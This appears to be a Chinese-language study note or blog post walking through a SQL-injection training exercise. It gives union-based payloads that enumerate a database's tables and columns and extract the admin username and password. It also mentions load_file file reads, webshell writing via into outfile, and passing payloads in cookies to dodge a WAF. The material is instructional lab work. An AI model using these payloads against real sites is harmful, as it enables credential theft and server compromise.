---
date: 2022-06-07 11:55:37
categories: 
  - 网络空间
tags: 
  - sql注入
author: 
  name: scucat
  link: https://github.com/scucat
---
# sql注入
相关教程

https://www.cnblogs.com/ihacker/p/11055191.html

## 注入流程
- 是否存在注入并且判断注入类型
- 判断字段数   order by 
- 确定回显点      union select 1,2
- 查询数据库信息    @@version    @@datadir
- 查询用户名，数据库名     user()   database()
- 文件读取  union select 1,load_file('C:\\wondows\\win.ini')#
- 写入 webshell       select..into  outfile...
- 补充一点，使用sql注入遇到转义字符串的单引号或者双引号，可使用HEX编码绕过

## SQL 注入常规利用思路：#
1. 寻找注入点，可以通过 web 扫描工具实现
2. 通过注入点，尝试获得关于连接数据库用户名、数据库名称、连接数据库用户权限、操作系统信息、数据库版本等相关信息。
3. 猜解关键数据库表及其重要字段与内容（常见如存放管理员账户的表名、字段名等信息）
3. 还可以获取数据库的root账号 密码—思路
4. 可以通过获得的用户信息，寻找后台登录。
5. 利用后台或了解的进一步信息。

## 习题1
https://bbs.zkaq.cn/?t/2642.html

### 1. 判断是否存在注入
如果语句1页面正常，语句2页面不正常，那么存在注入
```sql
?id=1 and 1=1
?id=1 and 1=2
```

### 2. 判断字段数
[使用order by排序判断字段数](https://blog.csdn.net/wangyuxiang946/article/details/121058067)
```
?id=1 and 1=1 order by 1  页面正常
?id=1 and 1=1 order by 2  页面正常
?id=1 and 1=1 order by 3  页面返回错误，判断字段数为2

```
order by怎么判断字段数？

原理很简单，就是利用数据库的「报错」机制
### 3. 判断回显点
```
?id=1 and 1=2 union select 1,2
```
![](https://bbs.zkaq.cn/upload/userfile/814/2e5c5824c7c2abd11571bef986f6dabe.png)

页面出现了  2  ，说明我们可以在数字  2  处显示我们想要的内容

### 4. 查询当前数据库名

构造 ?id=1 and 1=2 union select 1,database() 回车
![](https://bbs.zkaq.cn/upload/userfile/814/46d935412382cf748605ead31d519440.png)



### 查询当前数据库版本

构造 ?id=1 and 1=2 union select 1,version() 回车
![](https://bbs.zkaq.cn/upload/userfile/814/dcffa01ce32d5544aa3af08a6ab597c6.png)

### 查询当前数据库表名
构造 ?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1 回车
![](https://bbs.zkaq.cn/upload/userfile/814/ad3e67184d3fc69e17bb2cf236bc82dc.png)

绝大数情况下，管理员的账号密码都在admin表里


### 查询字段名
构造 ?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name='admin' limit 0,1 回车
![](https://bbs.zkaq.cn/upload/userfile/814/727912aee432793581fdc525eea5b7d3.png)

构造 ?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name='admin' limit 1,1 回车
![](https://bbs.zkaq.cn/upload/userfile/814/0e5e6f0b079395f54f066b62e370fd3c.png)


构造 ?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name='admin' limit 2,1 回车
![](https://bbs.zkaq.cn/upload/userfile/814/63c5e360490e6cd7472521cbc5344ea8.png)


查出 admin 表里 有  id   username  password  三个字段


### 查询字段内容
构造 ?id=1 and 1=2 union select 1,username from admin  limit 0,1 回车
![](https://bbs.zkaq.cn/upload/userfile/814/b45958e4625296047936bcc418dc3689.png)

构造 ?id=1 and 1=2 union select 1,password from admin  limit 1,1 回车
![](https://bbs.zkaq.cn/upload/userfile/814/93ea6cfe14260553ec81f2bb783f01ae.png)


limit 1,1 没有回显，说明只有一个用户

构造 ?id=1 and 1=2 union select 1,password from admin  limit 0,1 回车
![](https://bbs.zkaq.cn/upload/userfile/814/0b3a07dd50aa608a6475cf9501342162.png)

得到管理员账号和密码

## 习题2 绕过WAF
### 使用cookie进行传参
尝试将测试语句放到cookie里面，再发送给服务器，因为网页防护一般只拦截Get、post传参。

打开Chrome浏览器，这里用到了ModHeader插件
[ModHeader下载](http://bbs.zkaq.cn/?t/138.html)

> Access没有数据库名，但猜表名、列名，用手注非常耗时。管理员这里直接猜得的表名是 admin 、列名是username、password